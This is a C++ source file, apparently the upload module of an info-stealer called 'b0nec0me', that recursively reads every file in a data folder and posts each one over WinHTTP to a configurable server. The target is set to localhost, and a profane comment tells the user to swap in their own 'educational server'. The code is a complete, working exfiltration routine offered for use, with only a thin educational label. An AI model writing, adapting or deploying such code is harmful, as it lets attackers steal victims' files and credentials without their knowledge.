#include "send.h"

#include <windows.h>
#include <winhttp.h>
#include <filesystem>
#include <string>
#include <fstream>
#include <sstream>
#include <vector>

#pragma comment(lib, "winhttp.lib")

//change this URL to your educational server, you fucking black hat piece of shit.
const std::wstring SERVER_HOST = L"127.0.0.1";
const INTERNET_PORT SERVER_PORT = 5000;
const std::wstring SERVER_PATH = L"/upload";

static std::string read_file(const std::filesystem::path& filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) return "";

    std::ostringstream oss;
    oss << file.rdbuf();
    return oss.str();
}

static bool send_post(const std::string& data, const std::string& filename) {
    bool result = false;

    HINTERNET hSession = WinHttpOpen(L"b0nec0me-agent/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST.c_str(), SERVER_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", SERVER_PATH.c_str(),
                                           NULL, WINHTTP_NO_REFERER,
                                           WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    std::string boundary = "----b0nec0meBoundary";
    std::ostringstream ss;
    ss << "--" << boundary << "\r\n";
    ss << "Content-Disposition: form-data; name=\"file\"; filename=\"" << filename << "\"\r\n";
    ss << "Content-Type: application/octet-stream\r\n\r\n";
    ss << data << "\r\n";
    ss << "--" << boundary << "--\r\n";

    std::string postData = ss.str();
    std::wstring contentType = L"multipart/form-data; boundary=" + std::wstring(boundary.begin(), boundary.end());

    BOOL bResults = WinHttpSendRequest(hRequest,
                                       contentType.c_str(),
                                       (DWORD)contentType.size(),
                                       (LPVOID)postData.c_str(),
                                       (DWORD)postData.size(),
                                       (DWORD)postData.size(),
                                       0);

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
        if (bResults) {
            result = true;
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result;
}

void send_all_data(const std::string& dataFolder) {
    if (!std::filesystem::exists(dataFolder)) return;

    for (const auto& entry : std::filesystem::recursive_directory_iterator(dataFolder)) {
        if (!entry.is_regular_file()) continue;

        std::string filepath = entry.path().string();
        std::string filename = entry.path().filename().string();

        std::string content = read_file(entry.path());
        if (content.empty()) continue;

        send_post(content, filename);
    }
}
